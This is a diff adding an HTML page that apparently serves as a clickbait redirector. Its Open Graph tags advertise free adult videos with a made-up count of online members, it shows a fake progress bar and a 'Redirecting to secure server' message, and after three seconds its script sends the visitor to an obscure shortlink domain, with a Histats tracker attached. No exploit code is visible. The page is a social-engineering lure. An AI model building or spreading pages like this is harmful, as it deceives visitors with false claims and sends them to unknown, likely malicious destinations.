@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- OPEN GRAPH (FB PREVIEW) -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="WATCH TODAY'S TRENDING ADULT VIDEOS 100% FREE NOW">
+<meta property="og:description" content="729.784 Online Members">
+<meta property="og:image" content="https://res.cloudinary.com/dhmu3r2gj/image/upload/v1774215928/u1djlkkavkbbs6njwvy5.jpg">
+<meta property="og:image:width" content="1080">
+<meta property="og:image:height" content="1080">
+
+<!-- STYLE ANIMASI -->
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html, body {
+  height: 100%;
+  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
+  color: #fff;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  overflow: hidden;
+}
+
+.wrap {
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  position: relative;
+}
+
+/* Background animated particles */
+.particles {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  z-index: 0;
+}
+
+.particle {
+  position: absolute;
+  width: 4px;
+  height: 4px;
+  background: rgba(255, 255, 255, 0.3);
+  border-radius: 50%;
+  animation: float 15s infinite;
+}
+
+@keyframes float {
+  0%, 100% {
+    transform: translateY(100vh) rotate(0deg);
+    opacity: 0;
+  }
+  10% {
+    opacity: 1;
+  }
+  90% {
+    opacity: 1;
+  }
+  100% {
+    transform: translateY(-100vh) rotate(720deg);
+    opacity: 0;
+  }
+}
+
+/* Main content */
+.content {
+  z-index: 1;
+  text-align: center;
+}
+
+/* Modern spinner */
+.loader-container {
+  position: relative;
+  width: 120px;
+  height: 120px;
+  margin-bottom: 30px;
+}
+
+.loader {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border: 4px solid transparent;
+  border-top-color: #3b82f6;
+  border-right-color: #8b5cf6;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+.loader-inner {
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  right: 15px;
+  bottom: 15px;
+  border: 4px solid transparent;
+  border-top-color: #ec4899;
+  border-left-color: #f59e0b;
+  border-radius: 50%;
+  animation: spin-reverse 1.5s linear infinite;
+}
+
+.loader-core {
+  position: absolute;
+  top: 35px;
+  left: 35px;
+  right: 35px;
+  bottom: 35px;
+  background: linear-gradient(135deg, #3b82f6, #ec4899);
+  border-radius: 50%;
+  animation: pulse 2s ease-in-out infinite;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+@keyframes spin-reverse {
+  to { transform: rotate(-360deg); }
+}
+
+@keyframes pulse {
+  0%, 100% { transform: scale(1); opacity: 0.8; }
+  50% { transform: scale(1.1); opacity: 1; }
+}
+
+/* Loading text */
+.text {
+  font-size: 28px;
+  font-weight: 700;
+  margin-bottom: 10px;
+  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
+  background-size: 200% auto;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  animation: gradient-shift 3s ease infinite;
+}
+
+@keyframes gradient-shift {
+  0% { background-position: 0% center; }
+  50% { background-position: 100% center; }
+  100% { background-position: 0% center; }
+}
+
+.subtext {
+  font-size: 14px;
+  color: rgba(255, 255, 255, 0.6);
+  margin-bottom: 25px;
+}
+
+/* Progress bar */
+.progress-container {
+  width: 280px;
+  height: 6px;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  overflow: hidden;
+  margin-bottom: 15px;
+}
+
+.progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
+  border-radius: 10px;
+  width: 0%;
+  animation: loading 3s ease-in-out forwards;
+  box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+}
+
+@keyframes loading {
+  0% { width: 0%; }
+  100% { width: 100%; }
+}
+
+/* Percentage counter */
+.percentage {
+  font-size: 16px;
+  font-weight: 600;
+  color: #3b82f6;
+  font-variant-numeric: tabular-nums;
+}
+
+/* Redirect message */
+.redirect-msg {
+  margin-top: 20px;
+  padding: 12px 24px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 50px;
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.7);
+  backdrop-filter: blur(10px);
+  opacity: 0;
+  transform: translateY(10px);
+  animation: fade-in-up 0.5s ease forwards 2s;
+}
+
+@keyframes fade-in-up {
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.redirect-msg span {
+  color: #3b82f6;
+  font-weight: 600;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .loader-container {
+    width: 100px;
+    height: 100px;
+  }
+  
+  .loader-core {
+    top: 28px;
+    left: 28px;
+    right: 28px;
+    bottom: 28px;
+    font-size: 20px;
+  }
+  
+  .text {
+    font-size: 24px;
+  }
+  
+  .progress-container {
+    width: 240px;
+  }
+}
+</style>
+
+</head>
+<body>
+  <div class="wrap">
+    <!-- Background particles -->
+    <div class="particles" id="particles"></div>
+    
+    <div class="content">
+      <div class="loader-container">
+        <div class="loader"></div>
+        <div class="loader-inner"></div>
+        <div class="loader-core">🔴</div>
+      </div>
+      
+      <div class="text">Wait a minute!</div>
+      <div class="subtext">Preparing your exclusive content</div>
+      
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      
+      <div class="percentage" id="percentage">0%</div>
+      
+      <div class="redirect-msg">
+        Redirecting to <span>secure server</span> in <span id="countdown">3</span>s
+      </div>
+    </div>
+  </div>
+
+<script>
+// Create floating particles
+const particlesContainer = document.getElementById('particles');
+for (let i = 0; i < 50; i++) {
+  const particle = document.createElement('div');
+  particle.className = 'particle';
+  particle.style.left = Math.random() * 100 + '%';
+  particle.style.animationDelay = Math.random() * 15 + 's';
+  particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+  particlesContainer.appendChild(particle);
+}
+
+// Animate percentage counter
+let percentage = 0;
+const percentageEl = document.getElementById('percentage');
+const interval = setInterval(() => {
+  percentage += Math.floor(Math.random() * 3) + 1;
+  if (percentage >= 100) {
+    percentage = 100;
+    clearInterval(interval);
+  }
+  percentageEl.textContent = percentage + '%';
+}, 50);
+
+// Countdown timer
+let countdown = 3;
+const countdownEl = document.getElementById('countdown');
+const countdownInterval = setInterval(() => {
+  countdown--;
+  if (countdown <= 0) {
+    clearInterval(countdownInterval);
+  } else {
+    countdownEl.textContent = countdown;
+  }
+}, 1000);
+
+// Delay redirect
+setTimeout(function () {
+  window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
+}, 3000); // 3 detik untuk animasi lebih smooth
+</script>
+
+    <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5009121,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5009121&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+</body>
+</html>
